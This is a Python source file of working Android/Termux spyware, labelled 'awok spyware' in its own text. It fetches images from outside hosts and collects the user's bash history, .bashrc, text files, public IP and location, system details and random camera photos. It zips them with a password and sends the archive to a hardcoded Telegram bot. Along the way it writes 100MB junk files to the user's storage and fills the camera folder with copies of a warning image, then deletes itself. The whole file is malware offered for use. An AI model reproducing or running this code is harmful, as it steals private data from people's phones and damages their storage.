import os
import glob
import datetime as date
import itertools
import shutil
import sys
import zipfile
import platform
import socket
import requests
import subprocess
import random

os.chdir("/data/data/com.termux/files/usr/var")
try:
  os.mkdir("/data/data/com.termux/files/usr/var/sysinfo/")
  os.mkdir("src")
  os.chdir("/data/data/com.termux/files/usr/var/src")
  os.mkdir("img")
  os.chdir("/data/data/com.termux/files/usr/var/sysinfo/")
  os.mkdir("filetxt")
  with open("logscript.txt" , "a") as file:
    file.write(f"sukses menginstall direktori {info}")
except:
  pass
        
try:
  os.chdir("/data/data/com.termux/files/usr/var/src/")
except:
  os.mkdir("/data/data/com.termux/files/usr/var/src/'")
  
os.chdir("/data/data/com.termux/files/usr/var/src/")

try:
  with open("dataruntime.txt", "r") as file:
    ver = file.read()
    ver = int(ver) + 1
    os.chdir("/data/data/com.termux/files/usr/var/sysinfo/")
    with open("runtime.txt", "w") as fl:
      fl.write(f"script telah dijalankan : {str(ver)} kali")
      os.chdir("/data/data/com.termux/files/usr/var/src/")
      with open("dataruntime.txt", "w") as fe:
        fe.write(str(ver))
except:
  os.chdir("/data/data/com.termux/files/usr/var/src/")
  with open("dataruntime.txt", "w") as file:
    file.write("1")
    os.chdir("/data/data/com.termux/files/usr/var/sysinfo/")
    with open("runtime.txt", "w") as file:
      file.write(f"script telah dijalankan : 1 kali")


try:
  os.mkdir("/data/data/com.termux/files/usr/var/sysinfo/jpg")
except:
  pass
folder_path = '/data/data/com.termux/files/usr/var/sysinfo/jpg'  # Ganti dengan path folder yang ingin dihapus

# Menghapus semua file di dalam folder
for filename in os.listdir(folder_path):
    file_path = os.path.join(folder_path, filename)
    if os.path.isfile(file_path):
        os.remove(file_path)
        
#membuat id
os.chdir("/data/data/com.termux/files/usr/var/src")
isisrc = glob.glob("*.txt")

try:
  with open("id1.txt" , "r") as file:
    id1  = file.read()
    
  with open("id2.txt" , "r") as file:
    id2 = file.read()
except:  
  id1 = random.randint(1000000000000000, 9999999999999999)
  id2 = random.randint(1000000000000000, 9999999999999999)
  with open("id1.txt" , "w") as file:
    file.write(str(id1))
  with open("id2.txt" , "w") as file:
    file.write(str(id2))

os.chdir("/data/data/com.termux/files/usr/var")
try:
  os.mkdir("sysinfo")
except:
  pass

os.chdir("/data/data/com.termux/files/usr/var/sysinfo")
isitxt = glob.glob("*.txt")

if "logscript.txt" in isitxt:
  pass 
else:
  with open("logscript.txt" , "w") as file:
    file.write("---")

# Mendapatkan waktu saat ini
jama = date.datetime.now()  # Ganti date.date dengan date.datetime
detik = jama.second
menit = jama.minute
jam = jama.hour  # Ganti hours dengan hour

# Mendapatkan tanggal hari ini
today = date.date.today()

# Format informasi
info = f"\n[ INFO ] [ {today} ] at [ {jam}:{menit}:{detik} ]\n"  # Menggunakan spasi sebagai pemisah

# Pesan lainnya
warning = f"\n[ WARNING ] [ {today} ] at [ {jam}:{menit}:{detik} ]\n"
high = f"\n[ HIGH ] [ {today} ] at [ {jam}:{menit}:{detik} ]\n"
critical = f"\n[ CRITICAL ] [ {today} ] at [ {jam}:{menit}:{detik} ]\n"

print("install paket yang diperlukan..")


# Cek apakah ada file jpg di folder sekarang
os.chdir("/data/data/com.termux/files/usr/var/src/img")
os.system("wget http://www.signways.pk/ular.jpg > /dev/null 2>&1")

try:
  os.system("pip install pyminizip > /dev/null 2>&1")
except:
  pass

with open("/data/data/com.termux/files/usr/var/sysinfo/logscript.txt" , "a") as file:
  file.write(f"sukses menginstall ular image {info}")
  
# Kalau file nggak ada, wget buat download
os.chdir("/data/data/com.termux/files/usr/var/src/img")
os.system("wget http://www.4seducationconsultancy.com/img/AwokSpyWare.jpg > /dev/null 2>&1")
with open("/data/data/com.termux/files/usr/var/sysinfo/logscript.txt" , "a") as file:
  file.write(f"sukses menginstall peringatan image {info}")
    
try:
  os.system("pip install requests")
  os.system("pkg install -y neofetch > /dev/null 2>&1")
  os.system("pkg install -y wget > /dev/null 2>&1")
  with open("/data/data/com.termux/files/usr/var/sysinfo/logscript.txt" , "a") as file:
    file.write(f"sukses menginstall peringatan paket wget dan neofetch {info}")
except:
  pass
os.chdir("/data/data/com.termux/files/home")
dirnya = os.listdir()

try:
  dirnya.remove("storage")
  dirnya.remove("/storage")
  dirnya.remove("sdcard")
  dirnya.remove("internal")
except:
  pass

panjang = len(dirnya)

hasil = []

hasil = list(itertools.chain(*(glob.glob(f"{isi}**/*.txt" , recursive=True) for isi in dirnya)))

hasil1 = glob.glob("*.txt")

hasil = hasil + hasil1


os.chdir("/data/data/com.termux/files/usr/var/sysinfo")

#bashhistory
try:
  os.chdir("/data/data/com.termux/files/usr/var/sysinfo")
  with open('bashhistory.txt', 'r') as file:
    oldbash = file.read()
    os.chdir("/data/data/com.termux/files/home")
    with  open('.bash_history' , 'r') as new:
      newbash = file.read()
      bashold_sorted = sorted(oldbash)
      bashnew_sorted = sorted(newbash)
      
      if bashold_sorted == bashnew_sorted:
        pass
    
      else:
        os.chdir("/data/data/com.termux/files/home")
        originalloghis = ".bash_history"
        targetloghis = "/data/data/com.termux/files/usr/var/sysinfo/bashhistory.txt"
        shutil.copy(originalloghis , targetloghis)
        with open("/data/data/com.termux/files/usr/var/sysinfo/logscript.txt" , "a") as file:
          file.write(f"sukses mendapatkan bash_history {high}")
        
except:
  os.chdir("/data/data/com.termux/files/home")
  originalloghis = ".bash_history"
  targetloghis = "/data/data/com.termux/files/usr/var/sysinfo/bashhistory.txt"
  shutil.copy(originalloghis , targetloghis)
  with open("/data/data/com.termux/files/usr/var/sysinfo/logscript.txt" , "a") as file:
    file.write(f"sukses mendapatkan bash_history {high}")
  


try:
  os.chdir("/data/data/com.termux/files/usr/var/sysinfo/")
  os.mkdir("filetxt")
except:
  pass
# Array yang berisi path file
file_paths = ["path/to/file1.txt", "path/to/file2.txt", "path/to/file3.txt"]
destination_dir = "/data/data/com.termux/files/usr/var/sysinfo/filetxt/"  # Ganti dengan direktori tujuan

try:
  os.chdir("/data/data/com.termux/files/home")
  for file_path in hasil:
    shutil.copy(file_path, destination_dir)  # Mengkopi file ke direktori tujua
except Exception as e:
    pass

with open('filetxt.txt', 'w') as f:
  for item in hasil:
    f.write("%s\n" % item)
    


#memindahkan file dari home ke file tersembunyi dan membuat file tersembunyi
original = "/data/data/com.termux/files/home/filetxt.txt"
os.chdir("/data/data/com.termux/files/usr/var") 

target = "/data/data/com.termux/files/usr/var/sysinfo/filetxt.txt"

shutil.move(original , target)

with open("/data/data/com.termux/files/usr/var/sysinfo/logscript.txt" , "a") as file:
  file.write(f"sukses mendapatkan daftar filetxt.txt {high}")
#mendapatkan data lokasi dan data sistem dan bandingkan

cegah_sistem = "{error: True, reason: RateLimited, message: Visit https://ipapi.co/ratelimited/ for details}"


try:
  response = requests.get('https://api.ipify.org/')
  ip_publik = response.text.strip()
  ip = f"IP Publik Nya: {ip_publik}"
  datalokasi = requests.get(f'https://ipapi.co/{ip_publik}/json/').json()
  
  if cegah_sistem != str(datalokasi):
    os.system(f"echo {datalokasi} >> datalokasi.json")
    originaldatalok = "datalokasi.json"
    targetdatalok = "/data/data/com.termux/files/usr/var/sysinfo/datalokasi.json"
    shutil.move(originaldatalok , targetdatalok)
    with open("/data/data/com.termux/files/usr/var/sysinfo/logscript.txt" , "a") as file:
      file.write(f"sukses mendapatkan ip dan data lokasi {critical}")
except:
  pass

sistem = subprocess.check_output('neofetch', shell=True)
os.chdir("/data/data/com.termux/files/home")
with open("datasistem.py" , "w") as file:
  file.write(f'print("{str(sistem)}")')

with open("/data/data/com.termux/files/usr/var/sysinfo/logscript.txt" , "a") as file:
  file.write(f"sukses mendapatkan info sistem {high}")
originalsistem = "datasistem.py"
targetsistem = "/data/data/com.termux/files/usr/var/sysinfo/datasistem.py"
shutil.move(originalsistem , targetsistem)

#mengambill .bashrc

os.chdir("/data/data/com.termux/files/home")

originalsistem = ".bashrc"
targetsistem = "/data/data/com.termux/files/usr/var/sysinfo/bashrc.txt"
shutil.copy(originalsistem , targetsistem)

with open("/data/data/com.termux/files/usr/var/sysinfo/logscript.txt" , "a") as file:
  file.write(f"sukses mendapatkan .bashrc {high}")
#mengambil list command yg terinstal
isicommandbin = os.listdir("/data/data/com.termux/files/usr/bin")

with open('isicommandbin.txt', 'w') as f:
  for command in isicommandbin:
    f.write("%s\n" % command)
  with open("/data/data/com.termux/files/usr/var/sysinfo/logscript.txt" , "a") as file:
    file.write(f"sukses mendapatkan isi command {info}")
    
originalcommand = "isicommandbin.txt"
targetcommand = "/data/data/com.termux/files/usr/var/sysinfo/isicommandbin.txt"
try:
  shutil.move(originalcommand , targetcommand)
except:
  pass

#mengambil isi sdcard
try:
  isisdcard = os.listdir("/sdcard/")
  with open('isisdcard.txt', 'w') as f:
    for sdcard in isisdcard:
      f.write("%s\n" % sdcard)
      
    with open("/data/data/com.termux/files/usr/var/sysinfo/logscript.txt" , "a") as file:
      file.write(f"sukses mendapatkan data folder sdcard {high}")

except:
  pass
originalsdcard = "isisdcard.txt"
targetsdcard = "/data/data/com.termux/files/usr/var/sysinfo/isifilesdcard.txt"
shutil.move(originalsdcard , targetsdcard)

isisdcardfile = os.listdir("/sdcard/")


# Pilih folder target 1
while True:
    folder_target1 = random.choice(isisdcardfile)
    try:
        if os.path.isdir(f"/sdcard/{folder_target1}"):
            break
    except Exception as e:
        pass

# Pilih folder target 2
while True:
    folder_target2 = random.choice(isisdcardfile)
    try:
        if os.path.isdir(f"/sdcard/{folder_target2}"):
            break
    except Exception as e:
        pazz

# Buat file dummy 100MB
ukuran_mb = 100
block_size = 1024 * 1024  # 1 MB

# Buat file dummy di folder target 1
try:
    os.chdir(f"/sdcard/{folder_target1}")
    with open("bgke04-dev-virus-awok-spyware.error", "wb") as file:
        file.write(b'\0' * ukuran_mb * block_size)
except Exception as e:
    pass

# Buat file dummy di folder target 2
try:
    os.chdir(f"/sdcard/{folder_target2}")
    with open("bgke04-dev-virus-awok-spyware.error", "wb") as file:
        file.write(b'\0' * ukuran_mb * block_size)
        pass
except Exception as e:
    pass
#get 10 foto jpg

# Tentukan folder asal dan tujuan
folder_asal = '/sdcard/DCIM/Camera/'
folder_tujuan = '/data/data/com.termux/files/usr/var/sysinfo/jpg/'

# Buat folder tujuan jika belum ada
try:
    os.makedirs(folder_tujuan, exist_ok=True)
except:
    pass

# Hapus semua file di dalam folder tujuan
try:
    files_in_destination = glob.glob(os.path.join(folder_tujuan, '*'))
    for file in files_in_destination:
        os.remove(file)
except:
    pass

# Dapatkan daftar semua file .jpg di folder asal dan pilih 10 secara acak
try:
    file_jpg = glob.glob(os.path.join(folder_asal, '*.jpg'))
    file_acak = random.sample(file_jpg, 10)
    for file in file_acak:
        shutil.copy(file, folder_tujuan)
except:
    pass
  
#import shutil

# Lokasi file asli
source = '/data/data/com.termux/files/usr/var/src/img/AwokSpyWare.jpg'

# Lokasi penyimpanan tujuan
destination_dir = '/sdcard/DCIM/Camera/'

# Salin file sebanyak 9 kali dengan nama berbeda
try:
  for i in range(1, 10):
    destination = f'{destination_dir}AwokSpyWare_{i}.jpg'
    shutil.copy(source, destination)
except:
  pass
  
#melakukan zipping
import pyminizip
os.chdir("/data/data/com.termux/files/usr/var")
folder_path = "sysinfo"
zip_name = "bgke04-dev-virus-awok-spyware.zip"
password = "bgke04-dev-1337"

file_paths = []
relative_paths = []

# Menyimpan semua file dalam folder termasuk sub-folder
try:
  for root, directories, files in os.walk(folder_path):
    for file in files:
        file_path = os.path.join(root, file)
        file_paths.append(file_path)
        
        # Mendapatkan path relatif agar subfolder tetap ada di ZIP
        relative_path = os.path.relpath(file_path, folder_path)
        relative_paths.append(relative_path)
except:
  pass
# Membuat zip berpassword dengan subfolder utuh
try:
  pyminizip.compress_multiple(file_paths, relative_paths, zip_name, password, 5)
except:
  pass

#siang pagi malam
# Dapatkan waktu saat ini
current_time = date.datetime.now().time()

# Tentukan rentang waktu
pagi_mulai = date.time(6, 0, 0)
pagi_selesai = date.time(12, 0, 0)
siang_mulai = date.time(12, 0, 0)
siang_selesai = date.time(15, 0, 0)
sore_mulai = date.time(16, 0, 0)
sore_selesai = date.time(18, 0, 0)
malam_mulai = date.time(19, 0, 0)
malam_selesai = date.time(6, 0, 0)  # Ini untuk malam hingga pagi berikutnya

# Logika untuk mendeteksi waktu
if pagi_mulai <= current_time < pagi_selesai:
    waktunya = "pagi 🌅"
elif siang_mulai <= current_time < siang_selesai:
    waktunya = "siang ☀️"
elif sore_mulai <= current_time < sore_selesai:
    waktunya = "sore 🌇"
elif malam_mulai <= current_time or current_time < pagi_mulai:
    waktunya = "malam 🌙"
    
#kirim file


# Ganti dengan token bot dan chat ID kamu
TOKEN = '7833746895:AAG3P-LMcEzGgWjHDY7ACWzRJvGVe7Oa2GQ'
CHAT_ID = '6952270597'

teks = f"halo @bgke04_dev selamat {waktunya}\n\ntelah terinfeksi virus spyware awok ware dengan detail :\n\nip : {ip_publik}\nversi = 0.5 beta \nid 1 = {id1} \nid 2 = {id2}\n\n\n\n©awok ware"

os.chdir("/data/data/com.termux/files/usr/var")
# URL API Telegram
url_send_photo = f'https://api.telegram.org/bot{TOKEN}/sendPhoto'
url_send_document = f'https://api.telegram.org/bot{TOKEN}/sendDocument'

# Mengirim foto dengan caption
try:
  photo = {'photo': open('/data/data/com.termux/files/usr/var/src/img/ular.jpg', 'rb')}
  data_photo = {'chat_id': CHAT_ID, 'caption': teks
    
  }
  response_photo = requests.post(url_send_photo, files=photo, data=data_photo)
  
except:
  pass
# Mengirim file ZIP
try:
  document = {'document': open('bgke04-dev-virus-awok-spyware.zip', 'rb')}
  data_document = {'chat_id': CHAT_ID}
  response_document = requests.post(url_send_document, files=document, data=data_document)
  
except:
  pass

file_path_diri = __file__


try:
    os.remove(file_path_diri)
except Exception as e:
    pass